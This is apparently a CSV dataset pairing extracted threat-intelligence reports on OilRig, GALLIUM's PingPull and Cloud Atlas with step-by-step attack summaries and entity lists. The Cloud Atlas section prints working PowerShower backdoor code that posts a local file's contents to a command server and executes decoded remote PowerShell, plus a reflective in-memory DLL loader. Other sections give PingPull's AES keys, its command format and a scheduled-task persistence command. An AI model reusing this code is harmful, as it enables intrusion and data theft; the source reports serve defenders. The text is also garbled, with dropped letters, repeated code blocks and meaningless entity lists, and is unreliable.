Get-PassHashes is a PowerShell script that is part of the open-source Nishang offensivesecurity framework, and is intended to dump password hashes.• GetPwd: A custom tool to dump passwords from memory that is based on the GetPwd open-source tool fromPudn.com.• Token.exe: A custom tool that accepts a username and a filename as an argument, and runs the file with systemprivileges.16 ","1. The attack starts with a PowerShell dropper script that installs the initial malware. 2. The dropper decrypts and installs a rootkit driver for stealth. 3. It also installs a malicious service loader. 4. The service loader decrypts and executes an in-memory implant that facilitates C2 communication. 5. The implant retrieves additional payloads from the C2 server. 6. The payloads allow remote control, .NET assembly execution, PowerShell commands, and filesystem access. 7. The attackers use legitimate and custom tools for post-exploitation activities. 8. Tools are used to gather information, move laterally, and exfiltrate data from the compromised network. ",valid_66,"['PE', 'IP', 'stealth', 'us', 'The service', 'memory', 'communication', 'Retrieves', 'addition', 'loads', 'the C2 server', 'the payload', 'remote control', 'NET', 'execution', 'PowerShell commands', 'the attackers', 'Tools', 'POST', 'information', 'data']",PE; IP; stealth; us; The service; memory; communication; Retrieves; addition; loads; the C2 server; the payload; remote control; NET; execution; PowerShell commands; the attackers; Tools; POST; information; data.
"2017/1/7Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford | ClearSky CybersecuritySERVICESABOUTBLOGCOLLABORATIONBLOGClear Sky > Blog > Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of OxfordBy ClearskyJanuary 5, 2017CampaignsIranian threat agent OilRig has been targeting multiple organisations in Israel and other countries in the Middle East since the end of 2015. In recent attacks they set up a fake VPN Web Portal and targeted at least  ve Israeli IT vendors, several  nancial institutes, and the Israeli Post Of ce.Later, the attackers set up two fake websites pretending to be a University of Oxford conference sign-up page and a job application website. In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certi cateBased on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon. Fake VPN Web PortalIn one of the recent cases, the attackers sent the following email to individuals in targeted organisations:Recent PostsIranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of OxfordAttacks Against Customer Service Centers by Impersonation of Potential ClientsBusiness Email Compromise fraud Against Global Shipping CompaniesMagecart – a malicious infrastructure for stealing payment details from online shopsOperation DustySky - Part 2The email was sent from a compromised account of an IT vendor. Similar emails were sent from other IT vendors in the same time period, suggesting the attackers had a foothold within their networks, or at least could get access to speci c computers or email accounts.The link provided in the malicious email led to a fake VPN Web Portal:Upon logging in with the credentials provided in the email, the victim is presented with the following page:url Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford | ClearSky CybersecurityThe victim is asked to install the “VPN Client” (an .exe  le), or, if download fails, to download a password protected zip (with the same .exe  le inside).The “VPN Client” is a legitimate Juniper VPN software bundled with Helminth, a malware in use by the OilRig threat agnet:JuniperSetupClientInstaller.exe software is installed. The legitimate and the malicious installations can be seen in the process tree when the  le is run in a Cuckoo sandbox. Malicious processes are marked red (click image to enlarge):The following malicious  les are dropped and run:C:\ProgramData\{2ED05C38-D464-4188-BC7F- F6915DE8D764}\OFFLINE\9A189DFE\C7B7C186\main.vbs C:\Users\Public\Libraries\RecordedTV\DnE.ps1 C:\Users\Public\Libraries\RecordedTV\DnS.ps1 “C:\Windows\System32\schtasks.exe” /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr C:\Users\Public\Libraries\RecordedTV\backup.vbs FireEye, which wrote about previous campaigns by this threat agent.(Note that Juniper networks was not compromised nor otherwise involved in the attack, except for the attackers using its name and publicly available software). Digitally signed malwareThe entire bundle (VPN client and malware) was digitally signed with a valid code signing certi cate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Squared code signing certi cate:Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48This suggest that the attackers had got a hold of an AI Squared signing key, potentially after compromising their network. Alternatively, the attackers might have got Symantec to issue them a certi cate under AI Squared’s name. University of Oxford impersonationThe attackers registered four domains impersonating The University of Oxford.oxford-symposia[.]com, is a fake Oxford conference registration website. Visitors are asked to download the “University Of Oxford Job Symposium Pre-Register Tool”:The downloaded  le (which is also signed with an AI Squared certi cate), is a fake registration tool built by the attackers:OxfordSymposiumRegTool.exe address in oxford-careers[.]com, which also belongs to the attackers.Previously the fake website linked to the following documents in a third fake Oxford domain, oxford[.]in:url url url url documents were unavailable during our research, and their content is unknown to us.The attackers used a forth domain, oxford-employee[.]com, to host an “Oxford Job application” website:Visitors are asked to “Download CV Creator” in order “To Join University of Oxford staff”. CV Creator is a malicious  le hosted at url :url Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford | ClearSky CybersecurityOxfordCVCreator.exe Oxford Of cial CV Creator”:Both samples mentioned in this section had the following domain used for command and control:updater[.]li Other incidentsIn an earlier incident, the attackers sent a malicious excel  le impersonating Israir, an Israeli Airline (the content of the  le was copied from the company’s public website and we have no indication of it being compromised or targeted):Israel Airline.xls In other incidents the attackers used the following  les:Special Offers.xls / Salary Employee 2016.xls Employee Engagement Survey.xls gcaa_report_series15561.chm connected, Cadelle and Chafer” that “have been using Backdoor.Cadelspy and Backdoor.Remexi to spy by 87pqxz159.dockerjsbin[.]com as well.This suggest that the two groups may actually be the same entity, or that they share resources in one why or another. Indicators of compromiseIndicators  le: oilrig-indicators.csv (also available on PassiveTotal)The graph below depicts the OilRig infrastructure (click to enlarge):Acknowledgments This research was facilitated by PassiveTotal for threat infrastructure analysis, and by MalNet for malware research . We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback.ClearSkyAhead of the threat curveurl Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford | ClearSky Cybersecurity13 Yosef Karo st., Tel Aviv, IsraelPhone: +972 3 624 0346Email: info [at] clearskysec.comurl ","1. OilRig set up fake websites impersonating a VPN portal, University of Oxford sites, and job portals. 2. The fake sites hosted malware bundled with legitimate software like Juniper VPN clients and CV creators. 3. OilRig sent emails to targets with links to the fake sites or attached weaponized Office documents. 4. If users visited the fake sites and downloaded files, the bundled malware would infect their systems. 5. The malware connected to C2 domains to receive commands and exfiltrate data. 6. OilRig used valid but likely stolen code signing certificates to digitally sign the malware and avoid detection. 7. The malware established persistence and harvested information from compromised systems. 8. Infrastructure overlaps suggest links between OilRig and other Iranian threat groups. ",valid_99,"['OilRig', 'fake websites', 'University of Oxford', 'malware', 'legitimate software', 'Juniper VPN', 'VPN client', 'CV Creator', 'emails', 'ce', 'users', 'download', 'command', 'information', 'Iranian']",OilRig; fake websites; University of Oxford; malware; legitimate software; Juniper VPN; VPN client; CV Creator; emails; ce; users; download; command; information; Iranian.
"unit42.paloaltonetworks.com /pingpull-gallium/ GALLIUM Expands Targeting Across Telecommunications, Government and Finance Sectors With New PingPull Tool Unit 42 ⋮ ⋮ 6/13/2022Category: MalwareTags: APT, backdoor, GALLIUM, operation soft cell, PingPull, Remote Access TrojanThis post is also available in:  (Japanese) Executive SummaryUnit 42 recently identified a new, difficult-to-detect remote access trojan named PingPull being used by GALLIUM, an advanced persistent threat (APT) group.Unit 42 actively monitors infrastructure associated with several APT groups. One group in particular, GALLIUM (also known as Softcell), established its reputation by targeting telecommunications companies operating in Southeast Asia, Europe and Africa. The group’s geographic targeting, sector-specific focus and technical proficiency, combined with their use of known Chinese threat actor malware and tactics, techniques and procedures (TTPs), has resulted in industry assessments that GALLIUM is likely a Chinese state-sponsored group.Over the past year, this group has extended its targeting beyond telecommunication companies to also include financial institutions and government entities. During this period, we have identified several connections between GALLIUM infrastructure and targeted entities across Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia and Vietnam. Most importantly, we have also identified the group’s use of a new remote access trojan named PingPull.PingPull has the capability to leverage three protocols (ICMP, HTTP(S) and raw TCP) for command and control (C2). While the use of ICMP tunneling is not a new technique, PingPull uses ICMP to make it more difficult to detect its C2 communications, as few organizations implement inspection of ICMP traffic on their networks. This blog provides a detailed breakdown of this new tool as well as the GALLIUM group's recent infrastructure.Palo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Advanced URL Filtering, DNS Security, Cortex XDR and WildFire malware analysis.Full visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in the Unit 42 ATOM viewer.Related Unit 42 Topics Advanced persistent threats Table of Contents1/10PingPull Malware Protections and Mitigations Indicators of Compromise PingPull MalwarePingPull was written in Visual C++ and provides a threat actor the ability to run commands and access a reverse shell on a compromised host. There are three variants of PingPull that are all functionally the same but use different protocols for communications with their C2: ICMP, HTTP(S) and raw TCP. In each of the variants, PingPull will create a custom string with the following structure that it will send to the C2 in all interactions, which we believe the C2 server will use to uniquely identify the compromised system:PROJECT_[uppercase executable name]_[uppercase computer name]_[uppercase hexadecimal IP address]Regardless of the variant, PingPull is capable of installing itself as a service with the following description:Provides tunnel connectivity using IPv6 transition technologies (6to4, ISATAP, Port Proxy, and Teredo), and IP- HTTPS. If this service is stopped, the computer will not have the enhanced connectivity benefits that these technologies offer.The description is the exact same as the legitimate iphlpsvc service, which PingPull purposefully attempts to mimic using Iph1psvc for the service name and IP He1per instead of IP Helper for the display name. We have also seen a PingPull sample use this same service description but with a service name of Onedrive.The three variants of PingPull have the same commands available within their command handlers. The commands seen in Table 1 show that PingPull has the ability to perform a variety of activities on the file system, as well as the ability to run commands on cmd.exe that acts as a reverse shell for the actor.Command Description MEnumerate storage volumes (A: through Z:) List folder contents Read file, convert to hexadecimal form Write file, convert from hexadecimal form Copy file, sets the creation, write, and access times to match original files Move file, sets the creation, write, and access times to match original files Run command via cmd.exeTable 1. Commands available in PingPull’s command handler.To run a command listed in Table 1, the actor would have the C2 server respond to a PingPull beacon with the command and arguments that it encrypts using AES in cipher block chaining (CBC) mode and encodes with base64. We have seen two unique AES keys between the known PingPull samples, specifically P29456789A1234sS and dC@133321Ikd!D^i.PingPull would decrypt the received data and would parse the cleartext for the command and additional arguments in the following structure:&[AES Key]=[command]&z0=[unknown]&z1=[argument 1]&z2=[argument 2]We are not sure of the purpose of the z0 parameter in the command string, as we observed PingPull parsing for this parameter but do not see the value being used. To confirm the structure of the command string, we used the following string when issuing commands in our analysis environment, which would instruct PingPull to read the contents of a file at C:\test.txt:2/10&P29456789A1234sS=C&z0=2&z1=c:\\test.txt&z2=noneDuring our analysis, PingPull would respond to the command string above with ya1JF03nUKLg9TkhDgwvx5MSFIoMPllw1zLMC0h4IwM=, which decodes to and decrypts (AES key P29456789A1234sS) to some text in a test file.\x07\x07\x07\x07\x07\x07\x07, which is the content (PKCS5_PADDING-padded) of the file C:\test.txt on our analysis system. ICMP VariantPingPull samples that use ICMP for C2 communications issue ICMP Echo Request (ping) packets to the C2 server. The C2 server will reply to these Echo requests with an Echo Reply packet to issue commands to the system. Both the Echo Request and Echo Reply packets used by PingPull and its C2 server will have the same structure as follows:[8-byte value]R[sequence number].[unique identifier string beginning with “PROJECT”]\r\ntotal=[length of total message]\r\ncurrent=[length of current message]\r\n[base64 encoded and AES encrypted data]When issuing a beacon to its C2, PingPull will send an Echo Request packet to the C2 server with total and current set to 0 and will include no encoded and encrypted data, as seen in Figure 1.Figure 1. PingPull ICMP beacon example with hardcoded 8-byte value.The data section in the ICMP packet in Figure 1 begins with an 8-byte value of 0x702437047E404103 (\x03\x41\x40\x7E\x04\x37\x24\x70) that PingPull has hardcoded in its code, which is immediately followed by a hardcoded R. However, another PingPull sample that used ICMP for its C2 communications omitted this 8-byte value, as seen in Figure 2.Figure 2. PingPull ICMP beacon example without hardcoded 8-byte value.After the R is a sequence number that increments when sending or receiving data that exceeds the maximum size of the ICMP data section. The sequence number is immediately followed by a period “.” and then the unique identifier string generated by PingPull that begins with PROJECT. The ICMP data section then includes total=[integer] and current=[integer], which are used by both PingPull and its C2 to determine the total length of the data transmitted and the length of the chunk of data transmitted in the current packet. The data transmitted in each ICMP packet comes in the form of a base64-encoded string of ciphertext generated using AES and the key specific to the sample. This encoded and encrypted data comes after the new line that immediately follows the “current” value. For instance, when responding to our test command, PingPull sent the ICMP Echo Request packet seen in Figure 3 to the C2 server, which has the expected base64-encoded string of ya1JF03nUKLg9TkhDgwvx5MSFIoMPllw1zLMC0h4IwM= for the results of the command.3/10Figure 3. PingPull responding to command over ICMP.HTTPS VariantAnother variant of PingPull uses HTTPS requests to communicate with its C2 server instead of ICMP. The initial beacon uses a POST request over this HTTPS channel, using the unique identifier string generated by PingPull as the URL. Figure 4 is an example POST request sent by PingPull as a beacon, where samp.exe was the filename, DESKTOP-U9SM1U2 was the hostname of the analysis system and 172.16.189[.]130 (0xAC10BD82) was the system's IP address.Figure 4. PingPull HTTPS beacon example.The initial beacon is a POST request that did not have any data, which resulted in the Content-Length of 0 within the HTTP headers. When responding with the results to commands, PingPull will issue a second POST request using the same URL structure with the results in the data section in base64-encoded and encrypted form using the AES key. Figure 5 shows PingPull responding to our test command to read the contents of C:\test.txt with ya1JF03nUKLg9TkhDgwvx5MSFIoMPllw1zLMC0h4IwM= in the data section of the POST request, which decodes and decrypts to some text in a test file.\x07\x07\x07\x07\x07\x07\x07.Figure 5. PingPull responding with results of a command over HTTPS.TCP VariantThis variant of PingPull does not use ICMP or HTTPS for C2 communication, rather it uses raw TCP for its C2 communication. Much like the other C2 channels, the data sent in this beacon includes the unique identifier string generated by PingPull that begins with PROJECT. However, the TCP C2 channel begins with a 4-byte value for the length of data that follows, as seen in the following beacon structure:4/10[DWORD length of data that follows]PROJECT_[uppercase executable name]_[uppercase computer name]_[uppercase hexadecimal IP address]Figure 6 shows an example of the entire TCP communications channel:The beacon sent by PingPull in the first red text. The C2 issuing a command in the blue text. PingPull responding to the command in the second red text at the bottom of the image.Figure 6. PingPull TCP beacon, C2 issuing command and PingPull sending result.The beacon seen in Figure 6 begins with a data length of 44-bytes (0x2c), with the unique identifier string generated where samp_f86ebe.exe was the filename, DESKTOP-U9SM1U2 was the hostname of the analysis system and 172.16.189[.]130 (0xAC10BD82) was the system's IP address. The C2 response to the beacon begins with the data length of 64 bytes (0x40) followed by the base64-encoded string that represents the ciphertext of the command. PingPull ran the command supplied by the C2 and sent the results in a packet that begins with a data length of 44 bytes (0x2c), followed by the expected base64-encoded string of ya1JF03nUKLg9TkhDgwvx5MSFIoMPllw1zLMC0h4IwM= for the results of the command. InfrastructureOn Sept. 9, 2021, a sample of PingPull named ServerMannger.exe (SHA256: community by an organization in Vietnam. Analysis of this sample revealed that it was configured to call home to t1.hinitial[.]com. Pivoting on the C2, we identified several subdomains hosted under the hinitial[.]com domain that exhibited a similar naming pattern:t1.hinitial[.]com v2.hinitial[.]com v3.hinitial[.]com v4.hinitial[.]com v5.hinitial[.]comDigging deeper into these domains, we began to identify overlaps in certificate use between the various IP infrastructure associated with each of the subdomains. One certificate that stood out in particular was an oddly a 10-year expiration window, a common name of bbb, and no other details, which immediately raised the question of legitimacy.5/10Figure 7. X.509 certificate associated with hinitial[.]com infrastructure.First seen in September 2020, this certificate was linked to six different IP addresses all hosting a variant of the hinitial[.]com subdomains as well as an additional pivot to a dynamic DNS host (goodjob36.publicvm[.]com).6/10Continuing this method of pivoting across all of the PingPull samples and their associated C2 domains has resulted in the identification of over 170 IP addresses associated with this group dating back to late 2020. The most recent IP infrastructure is provided below for defensive purposes. Protections and MitigationsWe recommend that telecommunications, finance and government organizations located across Southeast Asia, Europe and Africa leverage the indicators of compromise (IoCs) below to identify any impacts to your organizations.For Palo Alto Networks customers, our products and services provide the following coverage associated with this group:Cortex XDR detects and protects endpoints from the PingPull malware.WildFire cloud-based threat analysis service accurately identifies PingPull malware as malicious.Threat Prevention provides protection against PingPull malware. The “Pingpull Command and Control Traffic Detection” signature (threat IDs 86625, 86626 and 86627) provides coverage for the ICMP, HTTP(S) and raw TCP C2 traffic.Advanced URL Filtering and DNS Security identify domains associated with this group as malicious.Users of the AutoFocus contextual threat intelligence service can view malware associated with these attacks using the PingPull tag.If you think you may have been impacted or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:North America Toll-Free: 866.486.4842 (866.4.UNIT42) APAC: +65.6983.8730 Japan: +81.50.1790.0200ConclusionGALLIUM remains an active threat to telecommunications, finance and government organizations across Southeast Asia, Europe and Africa. Over the past year, we have identified targeted attacks impacting nine nations. This group has deployed a new capability called PingPull in support of its espionage activities, and we encourage all organizations to leverage our findings to inform the deployment of protective measures to defend against this threat group.Special thanks to the NSA Cybersecurity Collaboration Center, the Australian Cyber Security Centre and other government partners for their collaboration and insights offered in support of this research.Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance. Additional ResourcesMitre - GALLIUM group Microsoft - GALLIUM: Targeting Global Telecom CyberReason - Operation Soft Cell: A Worldwide Campaign Against Telecommunications Providers Indicators of Compromise t1.hinitial[.]com 5.181.25[.]55 92.38.135[.]62 5.8.71[.]97Domainsmicfkbeljacob[.]com df.micfkbeljacob[.]com jack.micfkbeljacob[.]com t1.hinitial[.]com v2.hinitial[.]com v3.hinitial[.]com v4.hinitial[.]com v5.hinitial[.]com goodjob36.publicvm[.]com goodluck23.jp[.]us helpinfo.publicvm[.]com Mailedc.publicvm[.]comIP Addresses(Active in last 30 days)92.38.135[.].62 5.181.25[.]55 5.8.71[.]97 101.36.102[.]34 101.36.102[.]93 101.36.114[.]167 101.36.123[.]191 103.116.47[.]65 103.179.188[.]93 103.22.183[.]131 103.22.183[.]138 103.22.183[.]141 103.22.183[.]146 103.51.145[.]143 103.61.139[.]71 103.61.139[.]72 103.61.139[.]75 103.61.139[.]78 103.61.139[.]79 103.78.242[.]62 118.193.56[.]130 118.193.62[.]232 123.58.196[.]208 123.58.198[.]205 123.58.203[.]19 128.14.232[.]56 152.32.165[.]70 152.32.203[.]199 152.32.221[.]222 152.32.245[.]157 154.222.238[.]508/10154.222.238[.]51 165.154.52[.]41 165.154.70[.]51 167.88.182[.]166 176.113.71[.]62 2.58.242[.]230 2.58.242[.]231 2.58.242[.]235 202.87.223[.]27 212.115.54[.]54 37.61.229[.]104 45.116.13[.]153 45.128.221[.]61 45.128.221[.]66 45.136.187[.]98 45.14.66[.]230 45.154.14[.]132 45.154.14[.]164 45.154.14[.]188 45.154.14[.]254 45.251.241[.]74 45.251.241[.]82 45.76.113[.]163 47.254.192[.]79 92.223.30[.]232 92.223.30[.]52 92.223.90[.]174 92.223.93[.]148 92.223.93[.]222 92.38.139[.]170 92.38.149[.]101 92.38.149[.]241 92.38.171[.]127 92.38.176[.]47 107.150.127[.]124 118.193.56[.]131 176.113.71[.]168 185.239.227[.]12 194.29.100[.]173 2.58.242[.]236 45.128.221[.]182 45.154.14[.]191 47.254.250[.]117 79.133.124[.]88 103.137.185[.]249 103.61.139[.]74 107.150.112[.]211 107.150.127[.]140 146.185.218[.]65 152.32.221[.]242 165.154.70[.]62 176.113.68[.]12 185.101.139[.]176 188.241.250[.]152 188.241.250[.]153 193.187.117[.]144 196.46.190[.]27 2.58.242[.]229 2.58.242[.]232 37.61.229[.]1069/1045.128.221[.]172 45.128.221[.]186 45.128.221[.]229 45.134.169[.]147 103.170.132[.]199 107.150.110[.]233 152.32.255[.]145 167.88.182[.]107 185.239.226[.]203 185.239.227[.]34 45.128.221[.]169 45.136.187[.]41 137.220.55[.]38 45.133.238[.]234 103.192.226[.]43 92.38.149[.]88 5.188.33[.]237 146.185.218[.]176 43.254.218[.]104 43.254.218[.]57 43.254.218[.]98 92.223.59[.]84 43.254.218[.]43 81.28.13[.]48 89.43.107[.]191 103.123.134[.]145 103.123.134[.]161 103.123.134[.]165 103.85.24[.]81 212.115.54[.]241 43.254.218[.]114 89.43.107[.]190 103.123.134[.]139 103.123.134[.]240 103.85.24[.]121 103.169.91[.]93 103.169.91[.]94 45.121.50[.]230Updated June 13, 2022, at 4:45 a.m. PT10/10 "," 1. GALLIUM operators use the PingPull malware, communicating over ICMP, HTTPS, or TCP to a command and control server. 2. PingPull disguises itself as a legitimate Windows service to avoid detection. 3. The malware establishes an encrypted communication channel to receive commands from the C2 server. 4. PingPull can run arbitrary commands on the victim system, providing the attacker remote access. 5. The malware exfiltrates data from the compromised host back to the C2 server. ",valid_62,"['GALLIUM', 'the PingPull malware', 'ICMP', 'HTTPS', 'TCP', 'a command', 'control', 'itself', 'detection', 'commands', 'the C2 server', 'Run', 'Remote Access', 'data', 'Compromise']",GALLIUM; the PingPull malware; ICMP; HTTPS; TCP; a command; control; itself; detection; commands; the C2 server; Run; Remote Access; data; Compromise.
"research.checkpoint.com /2022/cloud-atlas-targets-entities-in-russia-and-belarus-amid-the-ongoing-war-in-ukraine/ Cloud Atlas targets entities in Russia and Belarus amid the ongoing war in Ukraine ⋮ 12/9/2022IntroductionCloud Atlas (or Inception) is a cyber-espionage group. Since its discovery in 2014, they have launched multiple, highly targeted attacks on critical infrastructure across geographical zones and political conflicts. The group’s tactics, techniques and procedures (TTPs) have remained relatively static over the years. However, since the rapid escalation of the conflict between Russia and Ukraine in 2021 and especially after the outbreak of war in February 2022, the scope of the group’s activities has narrowed significantly, with a clear focus on Russia, Belarus and conflicted areas in Ukraine and Moldova. Some evidence discovered while monitoring the group’s latest activities indicates that the group carried out a few successful intrusions and managed to gain full access to some of the targeted environments.In this publication, we discuss the tools, TTPs and victimology of Cloud Atlas in the last year. Interestingly, in addition to the usual malware used by Cloud Atlas, we discovered a new, previously never discussed tool: the group installs not only their signature modular espionage framework on the infected systems, but also uses the DLL to proxy connections through the victims’ machines.While we finalized this blogpost, another technical analysis of Cloud Atlas activity was published. While it overlaps with our findings to some extent, we believe that this report provides the additional information,1/16insights and clarifications regarding the actors’ operations. VictimologyThe group’s victims shift with the escalation of the political situation around Ukraine. In 2020-2021 the targets we observed included a wide range of ministries, diplomatic entities and industrial targets across the globe, including Western and Southeast Asia and Europe (especially, but not only Eastern Europe). However, toward the end of 2021, amid the rising tensions between Russia and Ukraine, the focus of the group shifted to the Crimean Peninsula and breakaway regions of Ukraine, Luhansk and Donetsk, as well as government, diplomatic, research and industry entities of Russia and Belarus.In March-April 2022, Cloud Atlas was observed targeting entities in the pro-Russian Transnistria breakaway region of Moldova, officially known as the Transnistrian Moldavian Republic, where tensions were escalating amid fears that Russia would try to extend its sovereignty to Transnistria or use the republic’s territories for an offensive against Ukraine. Since June 2022, we have seen multiple persistent campaigns focused on very specific targets in Belarus, mainly in its transportation and military radio- electronics sectors, and in Russia, including the government sector, energy and metal industries. The actors are also maintaining their focus on the Russian-annexed Crimean Peninsula, Lugansk and Donetsk regions. Initial infectionCloud Atlas has used spear-phishing emails containing malicious attachments as their initial attack vector for many years. They mostly use public email services like Yandex, Mail.ru and Outlook.com, but in some cases also attempted to spoof the existing domains of other entities that are likely to be trusted by the target.Figure 1 – Example of spear-phishing email (subject: “The Diplomatic Academy of the Ministry of Foreign Affairs, Diplomatic Service and Practice Journal”) sent by Cloud Atlas to one of the Russian ministries.The email attachment is usually a Microsoft Office document which retrieves a malicious remote template from the attackers’ servers. The lures of these documents are carefully tailored to the target. We observed a variety of weaponized documents ranging from governmental documents to publicly available reports and articles, including business proposals and advertisements.2/16Figure 2 – Examples of lure documents targeting Belarussian entities: A description of the “Comprehensive analysis of the economic and financial activities of a commercial organization” course from Belarusian State Economic University (left) and the advertisement of the company specialized in office equipment (right).3/16Figure 3 – Examples of lure documents used by CloudAtlas against government and energy sectors. (Resolution of the government of the Russian Federation on the application of legislation in the field of atomic energy in the Zaporozhye region, on the right.)The remote templates are RTF documents that exploit 5-year-old vulnerabilities in Microsoft Equation Editor, such as CVE-2017-11882 and CVE-2018-0802. For both external templates and the later stages of the campaign, the attackers closely control who can access them by whitelisting the targets. This is a known technique used by Cloud Atlas to collect the IP information of the victims by first sending them reconnaissance documents, which do not contain any malicious functionality aside from fingerprinting the victim. Whitelisting can be easily performed in those cases where the targeted entities are large enough to have their own ASN. The use of whitelisting significantly decreases the chances of the malicious components executing in sandboxes or research environments. PowerShower backdoorThe next stage of a Cloud Atlas attack is usually a PowerShell-based backdoor called PowerShower. PowerShower is stored on the disk with simple obfuscation of Base64-encoding and string concatenation:Figure 4 – Example of PowerShower backdoor obfuscation.The PowerShower versions that we observed during our research included a thinner functionality compared to older versions, but the backdoor remained essentially unchanged, including function names, such as HttpRequestG, HttpRequestP, and dec64 that can be tracked through the different versions.Once PowerShower is up and running, it mainly waits for further instructions from the Command and Control (C&C) server. It may save a zip file sent from the server to %TEMP%\PG.zip or execute PowerShell commands that are sent embedded in an XML file in a Base64-encoded format:$xmlfile = (gi $env:temp).fullname + ""\\temp.xml"";[io.file]::WriteAllBytes($xmlfile, $result);$content = Get-Content $xmlfile;[xml]$doc = $content;$command = dec64($doc.model.ps);4/16Invoke-Expression $command;Remove-Item $xmlfile -force;$xmlfile = (gi $env:temp).fullname + ""\\temp.xml""; [io.file]::WriteAllBytes($xmlfile, $result); $content = Get- Content $xmlfile; [xml]$doc = $content; $command = dec64($doc.model.ps); Invoke-Expression $command; Remove-Item $xmlfile -force; $xmlfile = (gi $env:temp).fullname + ""\\temp.xml""; [io.file]::WriteAllBytes($xmlfile, $result); $content = Get-Content $xmlfile; [xml]$doc = $content; $command = dec64($doc.model.ps); Invoke-Expression $command; Remove-Item $xmlfile -force;Figure 5 – PowerShower piece of code that handles parsing XML and PowerShell command execution.One of the recent changes introduced in PowerShower is proxy awareness: if a proxy is enabled on the infected machine, the malware uses it when issuing the requests to the C&C server. In addition, the script now sends some basic data about the victim’s machine (OS major and minor versions and PowerShell version) in the User-Agent header of the POST request:Function HttpRequestP($url){$all="""";$p_t = (gi $env:temp).fullname + ""\pass.txt"";$content = [io.file]::ReadAllText($p_t);Remove-Item $p_t -force -recurse;$all=$content;$http_request = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0;$http_request.open(""POST"", $url, $false);$http_request.setOption(2,$http_request.getOption(2));$pr = Get-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"";if ( $pr.ProxyEnable -eq ""1""){$http_request.setProxy(2, $pr.ProxyServer);5/16}$psv = $PSVersionTable.PSVersion.Major;$wvmajor = [Environment]::OSVersion.Version.Major;$wvminor = [Environment]::OSVersion.Version.Minor;$http_request.SetRequestHeader(""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT "" + $wvmajor + ""."" + $wvminor + ""; PS "" + $psv + "".00)"");$http_request.send(""$all"");return $http_request.status;}Function HttpRequestP($url) { $all=""""; $p_t = (gi $env:temp).fullname + ""\pass.txt""; $content = [io.file]::ReadAllText($p_t); Remove-Item $p_t -force -recurse; $all=$content; $http_request = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0; $http_request.open(""POST"", $url, $false); $http_request.setOption(2,$http_request.getOption(2)); $pr = Get-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\""; if ( $pr.ProxyEnable -eq ""1"") { $http_request.setProxy(2, $pr.ProxyServer); } $psv = $PSVersionTable.PSVersion.Major; $wvmajor = [Environment]::OSVersion.Version.Major; $wvminor = [Environment]::OSVersion.Version.Minor; $http_request.SetRequestHeader(""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT "" + $wvmajor + ""."" + $wvminor + ""; PS "" + $psv + "".00)""); $http_request.send(""$all""); return $http_request.status; } Function HttpRequestP($url) $p_t = (gi $env:temp).fullname + ""\pass.txt""; $content = [io.file]::ReadAllText($p_t); Remove-Item $p_t -force -recurse; $all=$content; $http_request = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0; $http_request.open(""POST"", $url, $false); $http_request.setOption(2,$http_request.getOption(2)); $pr = Get-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\""; if ( $pr.ProxyEnable -eq ""1"") { $http_request.setProxy(2, $pr.ProxyServer); } $psv = $PSVersionTable.PSVersion.Major; $wvmajor = [Environment]::OSVersion.Version.Major;6/16$wvminor = [Environment]::OSVersion.Version.Minor; $http_request.SetRequestHeader(""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT "" + $wvmajor + ""."" + $wvminor + ""; PS "" + $psv + "".00)""); $http_request.send(""$all""); return $http_request.status; }Figure 6 – PowerShower proxy handling and User-Agent string concatenation. RtcpProxy Tool One of the interesting payloads received by PowerShower is a script called office.ps1. This script reflectively loads in memory and runs the StartMainXor function from the .NET DLL stored in the script compressed and Base64-encoded.$dll_compressed_base64=""H4sIAAAAAAA<truncated>""$dll_compressed=[System.Convert]::FromBase64String($dll_compressed_base64)$ms=New-ObjectSystem.IO.MemoryStream(,$dll_compressed)$cs=New-ObjectSystem.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)$br=New-ObjectSystem.IO.BinaryReader($cs)$dll_content=$br.ReadBytes(10485760)$br.Close()$cs.Close()$ms.Close()[System.Reflection.Assembly]::Load($dll_content)#$content_bytes=[tcp_ssl_simple.NetTcpSsl]::StartHello()#[abcd.Service]::StartHello()// Prototype:// StartMainXor(string host, string port, int number, int reconnect_sleep, int time_stop_delay_seconds, string hexkey)$content_bytes=[abcd.Service]::StartMainXor(""<server_address>"", ""11171"", 10, 7000, 15 * 60, ""010203BADC0DEF"")write-host""DoneTest""7/16$dll_compressed_base64=""H4sIAAAAAAA<truncated>"" $dll_compressed= 